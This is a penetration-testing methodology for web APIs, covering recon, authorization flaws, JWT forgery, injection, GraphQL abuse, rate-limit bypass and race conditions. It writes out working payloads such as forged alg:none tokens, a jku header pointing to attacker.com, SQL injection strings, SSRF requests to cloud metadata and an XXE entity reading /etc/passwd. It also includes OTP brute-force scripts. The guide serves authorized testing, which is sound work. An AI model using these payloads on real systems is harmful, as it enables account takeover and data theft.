# API Pentesting Methodology

---

## 0. RULES OF ENGAGEMENT

- Focus on high-impact functionality first — authorization, authentication, business logic
- Never fuzz blindly without mapping what an endpoint actually does first
- If no meaningful progress in 20 minutes, pivot — don't tunnel
- Every finding must answer: does this lead to **account takeover**, **privilege escalation**, **sensitive data exposure**, or **RCE**?
- APIs expose application logic directly — exploit logic before injections
- Always test as multiple user roles if possible: unauthenticated, standard user, premium user, admin

---

## 1. RECONNAISSANCE & SURFACE MAPPING

### 1.1 API Discovery

Start by building a complete map before touching individual endpoints.

**Passive discovery — find what already exists:**
```
/api/              /api/v1/            /api/v2/
/v1/               /v2/                /v3/
/rest/             /graphql            /graphiql
/gql               /query             /playground
/swagger           /swagger.json       /swagger-ui.html
/openapi.json      /openapi.yaml       /api-docs
/redoc             /docs               /developer
/.well-known/      /sitemap.xml        /robots.txt
```

**Force-browse with wordlists:**
```bash
ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -mc 200,204,301,302,401,403 -o api_fuzz.json
```

**Spider with Burp:**
Target site → right-click → Spider/Crawl — ensures authenticated endpoints behind JS rendering are captured.

**JS file analysis — richest source of hidden endpoints:**
```bash
# Extract all JS files from a crawl, then:
cat js_urls.txt | xargs -I{} curl -s {} | grep -oE '(\/api\/[a-zA-Z0-9_\/\-]+)' | sort -u
```
Tools: **LinkFinder**, **JSParser**, **gf** (GF Patterns for API routes), **Burp's JS analysis** tab.

**API version enumeration — critical and commonly skipped:**
```
GET /api/v1/users
GET /api/v2/users
GET /api/v3/users
GET /api/beta/users
GET /api/internal/users
```
Older versions frequently lack the security controls added to newer ones. If `/v2/` returns 403 on a sensitive endpoint, try `/v1/` — authorization bypasses via old versions are extremely common.

**Changelog/commit history:** If you have access to GitHub/GitLab repos, look for endpoint removals in commit history — removed frontend calls sometimes still work server-side.

---

### 1.2 Documentation Discovery

Documentation tells you what the application *admits* it does — but often reveals more:
```
/swagger          /swagger.json       /swagger-ui.html
/api-docs         /openapi.json       /openapi.yaml
/redoc            /v1/docs            /graphql (introspection)
/postman.json     /insomnia.json
```

Import found docs directly into Burp or Postman for instant full-surface mapping. Pay specific attention to:
- **Admin endpoints** buried in documentation
- **Deprecated parameters** listed but "not recommended"
- **Internal-only APIs** documented but supposedly not exposed
- **Default field values** that hint at hidden object properties

---

### 1.3 Traffic Interception & Mapping

Use Burp Suite as a proxy for all interactions:
1. Browse all application functionality as an **unauthenticated** user → capture baseline
2. Register → repeat as **authenticated standard user** → note all new endpoints unlocked
3. If admin access exists → repeat as **admin** → enumerate all privileged functionality
4. Use **Logger++** or **Burp's HTTP History** filter to isolate API calls from page load noise:
   - Filter: `Content-Type: application/json` or path contains `/api/`

**Build an endpoint inventory table:**

| Endpoint | Method | Auth Required | Parameters | Purpose |
|---|---|---|---|---|
| /api/v1/users/{id} | GET | Yes | id | Fetch user profile |
| /api/v1/orders | POST | Yes | items, total | Create order |

This table drives all further testing. Never skip this step.

---

### 1.4 Authentication & Token Identification

Identify how authentication works before testing anything else:

- **JWT** — starts with `eyJ`, found in `Authorization: Bearer` or cookies
- **API Keys** — `X-API-Key`, `api_key=`, `Authorization: ApiKey`
- **OAuth tokens** — Bearer tokens from OAuth flows
- **Session cookies** — standard cookie-based auth
- **HMAC signatures** — request signing (common in payment APIs)
- **mTLS** — client certificate authentication (enterprise APIs)

Each type has its own attack surface — see Section 3.

---

## 2. API MAPPING — INPUT → PROCESSING → IMPACT

For **every endpoint**, determine before testing:

```
1. What input does it accept?          (body, query params, headers, path params)
2. What does it do with that input?    (database query, file operation, HTTP request, command)
3. What data does it return?           (user data, tokens, internal IDs, debug info)
4. Does it affect other users?         (shared resources, admin operations, messaging)
5. What is the worst-case impact?      (ATO, data exposure, financial loss, RCE)
```

### Data Flow → Attack Type Mapping

| Input reaches... | Test for |
|---|---|
| SQL database | SQL Injection |
| NoSQL database | NoSQL Injection |
| Backend HTTP request | SSRF |
| File system | Path Traversal, File Upload abuse |
| OS commands | Command Injection |
| Template engine | SSTI |
| XML parser | XXE |
| Object mapper / ORM | Mass Assignment |
| Deserialization | Insecure Deserialization |
| Another user's resource | BOLA / IDOR |
| Privileged functionality | Broken Function Level Authorization |

Prioritize by **worst-case impact**, not by ease.

---

## 3. AUTHORIZATION TESTING — HIGHEST PRIORITY

Authorization flaws are the most common and highest-impact API vulnerability class. Test these before anything else.

### 3.1 BOLA / IDOR (Broken Object Level Authorization)

The core question: **can User A access or modify User B's resources?**

**Step 1 — Identify object reference types:**
```
Numeric IDs:      /api/orders/1234
UUIDs:            /api/users/f7a3b2c1-...
Username-based:   /api/profile/john
Email-based:      /api/account/john@company.com
Compound refs:    /api/orgs/acme/users/42
```

**Step 2 — Register two accounts (attacker + victim) and map their resources.**

**Step 3 — Test cross-account access patterns:**
```http
# Replace victim's resource ID in attacker's authenticated request
GET /api/v1/users/VICTIM_ID/profile          → should return 403, returns 200?
GET /api/v1/orders/VICTIM_ORDER_ID           → should return 403, returns 200?
PUT /api/v1/users/VICTIM_ID                  → can attacker write to victim's account?
DELETE /api/v1/files/VICTIM_FILE_ID          → can attacker delete victim's data?
```

**Step 4 — Test indirect references:**
```http
# Sometimes the ID is embedded in the request body, not the URL
POST /api/v1/share
{"document_id": "VICTIM_DOC_ID", "recipient": "attacker@evil.com"}
```

**Step 5 — Test UUID-based endpoints (common misconception: UUIDs prevent IDOR):**
- UUIDs are hard to *guess* but if they appear in responses, logs, or other API calls, they can be harvested
- `GET /api/v1/users` → returns list of users with their UUIDs → use these to test access

**Step 6 — Use Burp Autorize extension:**
- Configure with victim's cookies/token + attacker's cookies/token
- Autorize automatically replays every request in attacker's context and flags bypasses

**Variants to test specifically:**
```
Horizontal IDOR:  User A accessing User B's resources at same privilege level
Vertical IDOR:    Standard user accessing admin-level resources
BFLA:             Accessing endpoints their role isn't supposed to have (see 3.2)
```

---

### 3.2 Broken Function Level Authorization (BFLA)

The question: **can a lower-privileged user call admin/privileged API functions?**

**Common patterns:**
```http
GET  /api/v1/admin/users         → list all users
POST /api/v1/admin/users         → create any user
PUT  /api/v1/admin/users/{id}    → modify any user
DELETE /api/v1/admin/users/{id}  → delete any user

POST /api/v1/users/{id}/promote  → escalate role
POST /api/v1/users/{id}/grant    → grant permissions
```

**Testing method:**
1. Map all endpoints visible as admin
2. Replay each admin endpoint with a standard user's token
3. Check HTTP status codes — many APIs return 200 even when they shouldn't
4. Check *response bodies* — even a 403 might execute the action before returning the error

**HTTP method switching — a consistently overlooked bypass:**
```http
# If GET is restricted, try:
GET    /api/v1/admin/users  → 403
POST   /api/v1/admin/users  → 200 (different auth check per method)
PUT    /api/v1/admin/users  → 200
DELETE /api/v1/admin/users  → 200

# Also test HEAD — sometimes bypasses auth checks entirely
HEAD   /api/v1/admin/users  → reveals resource existence without full auth check
```

**Path manipulation bypasses:**
```
/api/v1/admin/users          → 403
/api/v1/Admin/users          → 200 (case sensitivity)
/api/v1/admin/users/         → 200 (trailing slash)
/api/v1/admin/../admin/users → 200 (path traversal bypass)
/api/v1/admin/users.json     → 200 (extension bypass)
/api/v1/admin/users%20       → 200 (URL encoding bypass)
```

---

### 3.3 Mass Assignment

The question: **can user-supplied JSON fields modify properties the application didn't intend to expose?**

Most ORMs (Django, Rails ActiveRecord, Mongoose, Spring) automatically map all JSON fields in a request body to object properties. If the server doesn't explicitly define which fields are writable, attackers can inject hidden fields.

**Step 1 — Identify what the object model looks like:**
```http
# What does a normal registration look like?
POST /api/v1/register
{"username": "attacker", "password": "pass123", "email": "x@y.com"}

# What does the user profile response reveal?
GET /api/v1/users/me
{"id": 1, "username": "attacker", "email": "x@y.com", "role": "user",
 "is_admin": false, "is_verified": false, "subscription": "free"}
```

**Step 2 — Add the hidden fields back into write requests:**
```http
POST /api/v1/register
{"username": "attacker", "password": "pass123", "email": "x@y.com",
 "role": "admin", "is_admin": true, "is_verified": true, "subscription": "premium"}
```

**Step 3 — Check other write endpoints for the same:**
```http
PUT /api/v1/users/me
{"email": "new@email.com", "role": "admin"}     # Can role be changed on update?

POST /api/v1/checkout
{"items": [...], "total": 0.01}                  # Can total be overridden?

POST /api/v1/users/me/profile
{"display_name": "Bob", "credit_balance": 9999}  # Hidden financial field?
```

**Finding hidden fields:**
- Compare GET response body fields vs PUT/POST accepted fields
- Use **Param Miner** in Burp to mine for undocumented parameters
- Check Swagger/OpenAPI docs for fields marked `readOnly: false` that aren't in the UI
- Look at older API versions — they sometimes accept more fields than current versions

---

## 4. AUTHENTICATION TESTING

### 4.1 JWT Testing

**Step 1 — Decode and inspect:**
```bash
# Decode without verifying
echo "eyJ..." | base64 -d   # or use jwt.io
```
Check: algorithm, expiration (`exp`), issued-at (`iat`), subject (`sub`), custom claims (role, admin, plan).

**Step 2 — alg:none attack:**
```json
{"alg": "none", "typ": "JWT"}
{"sub": "administrator", "role": "admin"}
[empty signature — trailing dot only]
```
Result: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbmlzdHJhdG9yIn0.`

**Step 3 — Key confusion (RS256 → HS256):**
1. Obtain the server's **RSA public key** from `/jwks.json` or `/.well-known/jwks.json`
2. Change `alg` from `RS256` to `HS256`
3. Sign the modified token using the **public key as the HMAC secret**
4. The server validates it using the same public key — succeeds if no algorithm enforcement

**Step 4 — Weak secret brute-force:**
```bash
hashcat -a 0 -m 16500 eyJ... /usr/share/wordlists/rockyou.txt
jwt_tool eyJ... -C -d /usr/share/wordlists/rockyou.txt
```

**Step 5 — jku/jwk header injection:**
```json
# jku — server fetches keys from your URL
{"alg": "RS256", "jku": "https://attacker.com/jwks.json", "typ": "JWT"}

# jwk — embed your own public key in the header
{"alg": "RS256", "jwk": {"kty": "RSA", "n": "...", "e": "AQAB"}, "typ": "JWT"}
```

**Step 6 — kid path traversal:**
```json
{"alg": "HS256", "kid": "../../../dev/null", "typ": "JWT"}
# Sign with empty string as secret — /dev/null reads as empty
```

**Tool:** Burp JWT Editor extension — handles all of the above with a GUI.

---

### 4.2 API Key Testing

```http
# Try common locations:
Authorization: ApiKey KEY
X-API-Key: KEY
api_key=KEY (query param)
key=KEY (query param)

# Test key predictability — are keys sequential or derived from user data?
# Test key scope — does a key for one resource work on another?
# Test key permanence — do keys expire? Are they invalidated on logout?
# Check responses for leaked keys — error messages, debug info, other users' data
```

---

### 4.3 OAuth Testing

```
- Authorization code interception (redirect_uri manipulation)
- CSRF on OAuth flow (missing state parameter)
- Token leakage via Referer header
- Scope escalation (requesting more scopes than granted)
- Open redirect chained with OAuth to steal codes
- Token replay across different client applications
```

---

## 5. INPUT-BASED VULNERABILITY TESTING

### 5.1 Injection Testing in APIs

APIs pass user input to backends in JSON, headers, and path parameters — all injectable surfaces.

**SQL Injection in JSON:**
```json
{"username": "admin'--"}
{"id": "1 OR 1=1--"}
{"email": "' UNION SELECT null,null,null--"}
{"filter": {"$where": "sleep(5000)"}}    # MongoDB $where
```

**Blind SQLi via timing:**
```json
{"id": "1; WAITFOR DELAY '0:0:5'--"}     # MSSQL
{"id": "1 AND SLEEP(5)--"}               # MySQL
```

**SSRF via URL parameters:**
```json
{"url": "http://169.254.169.254/latest/meta-data/"}        # AWS metadata
{"webhook": "http://internal-service:8080/admin"}
{"avatar": "file:///etc/passwd"}
{"redirect": "http://attacker.com"}
```

**XXE via Content-Type switching:**
```bash
# Change Content-Type: application/json to Content-Type: application/xml
# Then send XML body:
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

**SSTI in template-rendering endpoints:**
```
{{7*7}}        ${7*7}         <%= 7*7 %>
{{config}}     {{self}}       {{request}}
```

---

### 5.2 Content-Type & Format Manipulation

Many APIs have format-specific validation logic that can be bypassed:
```
application/json → application/xml      (may enable XXE)
application/json → text/plain           (may bypass WAF rules)
application/json → multipart/form-data  (may bypass JSON-specific validation)
```

**Burp Content Type Converter extension** automates JSON ↔ XML ↔ form conversion.

**JSON structure manipulation:**
```json
# Parameter pollution — duplicate keys
{"role": "user", "role": "admin"}

# Array injection
{"role": ["user", "admin"]}

# Type confusion
{"amount": "100"}    vs    {"amount": 100}    vs    {"amount": true}

# Null injection
{"id": null}
{"verified": null}
```

---

## 6. GRAPHQL-SPECIFIC TESTING

### 6.1 Introspection Discovery

```bash
# Standard introspection query
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { queryType { name } } }"}'

# If blocked, try:
{"query": "{ __schema\n{ queryType { name } } }"}   # newline bypass
{"query": "{__schema{types{name}}}"}                 # compact format
```

**Use InQL Burp extension** to automatically enumerate and map the entire schema from introspection.

### 6.2 Field-Level IDOR

```graphql
# Test access to other users' data in query fields:
query {
  user(id: "VICTIM_ID") {
    email
    password_hash
    payment_info
    private_notes
  }
}
```

### 6.3 Batching Attack (Rate Limit Bypass)

```json
# Bypass per-request rate limiting by batching multiple operations:
[
  {"query": "mutation { login(username: \"admin\", password: \"pass1\") { token } }"},
  {"query": "mutation { login(username: \"admin\", password: \"pass2\") { token } }"},
  {"query": "mutation { login(username: \"admin\", password: \"pass3\") { token } }"}
]
```

### 6.4 Aliasing for Rate Limit Bypass

```graphql
mutation {
  alias1: login(username: "admin", password: "pass1") { token }
  alias2: login(username: "admin", password: "pass2") { token }
  alias3: login(username: "admin", password: "pass3") { token }
}
```

### 6.5 Nested Query Abuse (DoS potential)

```graphql
{
  user {
    friends {
      friends {
        friends {
          friends { name }
        }
      }
    }
  }
}
```

### 6.6 Mutation Authorization Testing

All the standard BOLA/BFLA tests apply to mutations — test whether standard users can call admin mutations.

---

## 7. RATE LIMITING & BRUTE FORCE TESTING

### 7.1 Rate Limit Bypass Techniques

**Header manipulation — most consistent bypass:**
```
X-Forwarded-For: 1.2.3.4          # change per request
X-Real-IP: 5.6.7.8
X-Originating-IP: 9.10.11.12
X-Client-IP: 13.14.15.16
X-Remote-IP: 17.18.19.20
True-Client-IP: 21.22.23.24
CF-Connecting-IP: 25.26.27.28     # Cloudflare header
```

**Request padding — defeat exact-match rate limiters:**
```
POST /api/v1/login
{"username": "admin", "password": "guess1", "padding": "aaa"}   # change padding each request
```

**Case/encoding variations — beat string-match based limits:**
```
username=admin     username=Admin     username=ADMIN
username=admin%00  username=admin.    username= admin
```

**Concurrent requests (race window exploitation — see Section 8):**
```bash
# Turbo Intruder — single-packet concurrent OTP brute force
for i in range(10000):
    engine.queue(target.req, str(i).zfill(4), gate='1')
engine.openGate('1')
```

**Endpoints most worth testing for rate limit bypass:**
```
POST /api/v1/auth/login
POST /api/v1/auth/verify-otp
POST /api/v1/password-reset/verify
POST /api/v1/email/verify
POST /api/v1/payment/charge
```

---

## 8. BUSINESS LOGIC & RACE CONDITIONS

### 8.1 Workflow Manipulation

**Step skipping:**
```
Normal: Step 1 → Step 2 → Step 3 → Purchase confirmed
Attack: Skip directly to Step 3 with a valid session — does authorization happen at each step or only at entry?
```

**State manipulation:**
```http
# Complete a purchase, then modify the order state before fulfillment:
POST /api/v1/orders → creates order (status: pending)
PUT  /api/v1/orders/{id} → {"status": "delivered"}  # can user set their own status?
```

**Parameter manipulation between steps:**
```http
# Step 1 — Submit cart with expensive items
POST /api/v1/cart/checkout
{"total": 0.01, "items": [...expensive items...]}

# Can the price be overridden in the request body?
# Is total validated server-side against actual item prices?
```

### 8.2 Race Conditions (TOCTOU)

**Setup in Burp Repeater:**
1. Duplicate the sensitive request 20 times
2. Group all tabs
3. Send group in parallel (single-packet attack)
4. Look for: multiple successful responses, inconsistent state, balance going below zero

**High-value race condition targets:**
```
POST /api/v1/redeem-coupon        # Apply promo code multiple times
POST /api/v1/withdraw             # Withdraw more than balance
POST /api/v1/transfer             # Double-spend in P2P transfers
POST /api/v1/claim-reward         # Claim one-time reward multiple times
POST /api/v1/vote                 # Vote multiple times on same item
```

---

## 9. SENSITIVE DATA EXPOSURE IN RESPONSES

APIs routinely return more data than the UI displays. Always inspect **raw API responses** in Burp, not the rendered page.

**Check responses for:**
```
Internal IDs that weren't shown in the UI
Other users' data in list/search endpoints
JWT tokens in response bodies
API keys, secrets, passwords in debug fields
Stack traces with internal paths
Internal hostnames and IP addresses
Soft-deleted data still returned
Future/draft content returned to non-admin users
Cryptographic material (hashes, signing keys)
```

**Excessive data exposure pattern:**
```json
// UI only shows name and email, but the API returns:
{
  "id": 1,
  "name": "Alice",
  "email": "alice@company.com",
  "role": "admin",
  "password_hash": "$2b$12$...",
  "internal_notes": "VIP customer - special pricing",
  "stripe_customer_id": "cus_xxx",
  "api_key": "sk_live_xxx"
}
```

**Comparison testing:** send the same request authenticated as a standard user vs admin. Do both return the same fields? If the API returns admin-only fields to standard users, that's excessive data exposure even if those fields aren't shown in the UI.

---

## 10. WEBSOCKET TESTING

WebSockets maintain a persistent connection — the initial HTTP handshake is the only place standard HTTP-level controls apply.

**Intercept WebSocket traffic in Burp:** Proxy → WebSockets history.

**Tests to run:**
```
Authentication: Can you establish a WebSocket without valid auth?
                Can you use an expired token after connection is established?
                Can you swap in another user's token after initial handshake?

Authorization:  Can you subscribe to another user's channel/room/feed?
                Can you send messages to resources you don't own?

Message tampering:
  {"action": "view_order", "order_id": "VICTIM_ORDER"}    → IDOR in WebSocket messages
  {"action": "admin_action", "target": "all_users"}        → privilege escalation via message
  {"amount": -100}                                         → negative value abuse

Input injection: WebSocket messages are often less sanitized than REST endpoints
  {"query": "admin' OR 1=1--"}                            → SQLi via WebSocket message
  {"url": "http://internal-service/"}                     → SSRF via WebSocket
```

---

## 11. EXPLOITATION & ESCALATION

### Step 1 — Confirm controllability
Reproduce the behavior consistently. Rule out false positives — especially important for race conditions and timing-based issues.

### Step 2 — Analyze trust boundary
```
What security control was bypassed?
  Authorization check → whose data can I access?
  Authentication check → can I impersonate any user?
  Business logic → can I manipulate financial state?
  Input validation → can I reach a dangerous backend component?
```

### Step 3 — Escalate impact
Never stop at "I can read User B's profile ID." Push to the highest realistic impact:
```
IDOR on profile read  →  can I read their private messages?
                      →  can I read their payment info?
                      →  can I write to their account (email change)?
                      →  can I trigger a password reset to my email?
                      →  full account takeover?
```

### Step 4 — Document before chaining
Save the working request/response pair before modifying it for escalation — you need clean evidence for the original finding regardless of whether escalation works.

---

## 12. VULNERABILITY CHAINING

### Common High-Impact Chains

```
BOLA (read) → BOLA (write) → account modification → account takeover

Mass Assignment → role: admin → admin API access → full application compromise

Excessive Data Exposure → harvest other users' tokens → replay tokens → account takeover

SSRF → internal metadata endpoint → cloud credentials → infrastructure compromise

GraphQL batching → bypass OTP rate limiting → brute force OTP → account takeover

BFLA on password reset → reset any user's password without knowing current password → ATO

JWT weak secret → forge admin token → admin API access → full compromise

Race condition on coupon redemption → apply multiple times → financial loss to vendor

IDOR on file read → read config files → credentials → database / admin access → RCE path
```

### Chaining Decision Tree

```
Every finding should trigger these questions:
  1. Can I write, not just read?
  2. Can I affect a privileged user's account?
  3. Can I combine this with an authentication weakness?
  4. Does this expose credentials or tokens usable elsewhere?
  5. Does this reach an internal system I can pivot through?
```

---

## 13. TOOL REFERENCE

### Core Workflow Tools

| Tool | Primary Use |
|---|---|
| **Burp Suite Pro** | Traffic interception, manual testing, scanning |
| **Postman / Insomnia** | API collection management, structured testing |
| **ffuf** | Endpoint fuzzing, parameter discovery |
| **httpx** | Rapid HTTP probing across target scope |
| **jq** | JSON response parsing and extraction in terminal |
| **jwt_tool** | JWT attack automation |
| **Hashcat** | JWT secret brute-forcing |

### Essential Burp Extensions

| Extension | Purpose |
|---|---|
| **Autorize** | Automated BOLA/BFLA testing across roles |
| **JWT Editor** | Full JWT attack suite (alg:none, key confusion, jku, jwk, kid) |
| **Param Miner** | Hidden parameter discovery via wordlist and header mining |
| **Content Type Converter** | JSON ↔ XML ↔ form-data conversion for format confusion testing |
| **Logger++** | Advanced traffic logging with filtering and search |
| **InQL** | GraphQL schema enumeration and attack surface mapping |
| **Turbo Intruder** | High-speed concurrent requests for race conditions and OTP brute force |

### Useful Commands

```bash
# Endpoint fuzzing
ffuf -u https://target.com/api/v1/FUZZ -w endpoints.txt -mc 200,401,403 -o results.json

# JWT secret brute-force
hashcat -a 0 -m 16500 eyJ... /usr/share/wordlists/rockyou.txt --show

# Extract API endpoints from JS files
cat target.js | grep -oE '"(/api/[^"]+)"' | sort -u

# Find BOLA candidates in responses
cat responses.txt | jq '.. | objects | keys[]' | sort -u | grep -i "id\|key\|ref"

# GraphQL introspection
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name } } } }"}' | jq .
```

---

## 14. EFFICIENCY RULES

```
1. Authorization first, always — it has highest ROI
2. Map before you test — untargeted fuzzing wastes time
3. Read API docs like an attacker — look for what they don't say
4. Test every write endpoint for mass assignment — ORMs make this extremely common
5. Check all API versions — v1 is almost always less hardened than v2
6. Inspect every response body in Burp — the UI only shows a fraction of API data
7. Pivot quickly — if an approach isn't yielding results in 20 minutes, move on
8. Chain aggressively — single low-severity findings often chain to critical
9. Save clean evidence before escalating — you need both the original and the chain
10. Test as all available roles — different tokens, different attack surface
```

---

## 15. VERIFICATION CHECKLIST

Before closing a finding:
```
[ ] Reproduced consistently at least 3 times
[ ] Tested from a clean session (no cached state)
[ ] Confirmed the response difference is meaningful (not just whitespace/timing)
[ ] Verified the impact is real (data returned belongs to another user / action executed)
[ ] Checked whether the finding affects other users or only the attacker
[ ] Ruled out that it's an intentional design decision (check docs/changelog)
[ ] Documented: exact request, exact response, reproduction steps, impact assessment
[ ] Assessed whether chaining escalates severity before reporting as standalone
```